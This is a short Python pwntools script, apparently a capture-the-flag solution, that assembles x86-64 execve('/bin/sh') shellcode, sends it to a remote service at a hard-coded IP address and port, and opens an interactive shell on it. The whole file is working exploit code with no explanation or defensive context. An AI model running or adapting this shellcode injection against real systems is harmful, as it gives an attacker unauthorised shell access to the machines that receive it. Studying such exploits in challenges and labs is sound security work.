from pwn import *


shellcode = '''start:jmp xx;yy:pop rdi;mov rax, 0x3b;mov rsi, 0;mov rdx, 0;syscall;xx:call yy;.string \"/bin/sh\";\n'''
f = remote('106.15.186.69',50002)
#f = process("./hfwsc64")
#gdb.attach(f)
context.log_level = 'DEBUG'
print shellcode
print f.recv()
m = asm(shellcode,arch='amd64')
print m 
f.send(m)
f.interactive()
